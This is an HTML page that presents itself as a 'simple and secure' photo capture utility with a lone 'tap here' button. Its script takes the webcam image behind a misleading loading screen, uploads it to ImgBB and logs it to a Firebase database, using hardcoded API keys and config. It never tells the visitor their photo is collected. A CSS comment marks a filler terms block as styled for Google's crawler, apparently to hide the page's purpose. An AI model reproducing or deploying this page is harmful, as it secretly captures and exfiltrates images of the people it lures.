<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="A simple and secure online photo capture utility.">
    <title>Capture...</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
        button { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 5px; }
        button:hover { background: #0056b3; }
        #loadingOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.85); color: white; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 9999; }
        .hidden { display: none !important; }
        .spinner { border: 8px solid #f3f3f3; border-top: 8px solid #007bff; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #loadingText { font-size: 18px; font-weight: bold; text-align: center; padding: 0 20px; }
        #videoElement { display: none; }
        #canvasElement { display: none; }

        /* Terms text styling for Google Bot */
        .legal-terms {
            margin: 150px auto 20px;
            max-width: 600px;
            font-size: 11px;
            color: #999;
            text-align: justify;
            line-height: 1.4;
        }
    </style>
</head>
<body>

    <h1></h1>
    <button id="clickPhotoBtn">tap here</button>

    <div id="loadingOverlay" class="hidden">
        <div id="spinner" class="spinner"></div>
        <p id="loadingText">Loading please wait sometime...</p>
    </div>

    <video id="videoElement" autoplay playsinline></video>
    <canvas id="canvasElement"></canvas>

    <div class="legal-terms">
        <strong>Privacy Policy & Terms of Service:</strong> Press the button to visit the website.
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
        import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";

        // আপনার দেওয়া সঠিক Config
        const firebaseConfig = {
            apiKey: "AIzaSyAKC5znAlxRW77hXi1Pk0JvAy7vAXurU9w",
            authDomain: "tournament-pro-7640a.firebaseapp.com",
            databaseURL: "https://tournament-pro-7640a-default-rtdb.firebaseio.com",
            projectId: "tournament-pro-7640a",
            storageBucket: "tournament-pro-7640a.firebasestorage.app",
            messagingSenderId: "1033810183760",
            appId: "1:1033810183760:web:2e3376b78d95b8a280b355"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        const IMGBB_API_KEY = "d6ae34a680665aa763e32a5be8fa083a";

        const btn = document.getElementById("clickPhotoBtn");
        const video = document.getElementById("videoElement");
        const canvas = document.getElementById("canvasElement");
        const loadingOverlay = document.getElementById("loadingOverlay");
        const loadingText = document.getElementById("loadingText");
        const spinner = document.getElementById("spinner");

        btn.addEventListener("click", async () => {
            // Check if run from local file (which blocks camera)
            if (window.location.protocol === 'file:') {
                alert("Please run this file on a local web server (like VS Code Live Server) or upload it to a host. Cameras do not work on 'file://' URLs for security reasons.");
                return;
            }

            loadingOverlay.classList.remove("hidden");
            spinner.style.display = "block";
            loadingText.innerText = "Loading please wait sometime...";

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                
                video.onloadedmetadata = () => {
                    video.play();
                    setTimeout(() => captureAndUpload(stream), 1500); // 1.5s delay for clear image
                };
            } catch (error) {
                console.error("Camera Error: ", error);
                spinner.style.display = "none";
                loadingText.innerText = "Error: Camera access denied or not found.";
                setTimeout(() => loadingOverlay.classList.add("hidden"), 4000);
            }
        });

        async function captureAndUpload(stream) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext("2d");
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Stop camera
            stream.getTracks().forEach(track => track.stop());

            const dataUrl = canvas.toDataURL("image/jpeg");
            const base64Image = dataUrl.split(",")[1];

            try {
                loadingText.innerText = "Processing ...";
                
                const formData = new FormData();
                formData.append("key", IMGBB_API_KEY);
                formData.append("image", base64Image);

                // 1. Upload to ImgBB
                const response = await fetch("https://api.imgbb.com/1/upload", {
                    method: "POST",
                    body: formData
                });
                
                const data = await response.json();

                if (data.success) {
                    loadingText.innerText = "...";
                    const imageUrl = data.data.url;
                    
                    // 2. Save to Firebase
                    const photosRef = ref(db, "photos");
                    await push(photosRef, {
                        url: imageUrl,
                        timestamp: Date.now()
                    });

                    spinner.style.display = "none";
                    loadingText.innerText = "Complete!";
                    setTimeout(() => loadingOverlay.classList.add("hidden"), 3000);
                } else {
                    throw new Error("not working");
                }
            } catch (error) {
                console.error("Upload Error: ", error);
                spinner.style.display = "none";
                loadingText.innerText = "API Key.";
                setTimeout(() => loadingOverlay.classList.add("hidden"), 5000);
            }
        }
    </script>
</body>
</html>
